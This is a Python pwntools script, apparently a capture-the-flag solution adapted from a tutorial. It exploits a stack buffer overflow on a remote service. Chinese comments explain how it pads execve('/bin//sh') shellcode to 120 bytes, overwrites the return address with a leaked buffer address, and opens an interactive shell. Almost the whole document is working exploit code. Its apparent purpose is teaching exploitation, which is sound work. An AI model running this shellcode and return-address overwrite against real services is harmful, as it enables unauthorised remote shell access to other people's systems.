# https://ithelp.ithome.com.tw/articles/10188599
from pwn import *

ip = 'ctf.adl.tw'
port = 11000
r = remote(ip, port)

# 對程式送出長度 > buffer 的字串，使其產生 overflow
shellcode = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
# buffer = shellcode + ...
shellcode += "a" * (120 - len(shellcode))
# 若 buffer < shellcode，則必須使用其他攻擊方法

address = r.recv()
print("address: " + address)

# overflow 的部分會被寫入記憶體，覆蓋掉記憶體中的 return address
# 當程式執行完畢 return 時會被重新指回 buffer 的記憶體位址，執行一開始植入的 shellcode
shellcode += p64(int(address.decode(), 16))

r.send(shellcode)
r.interactive()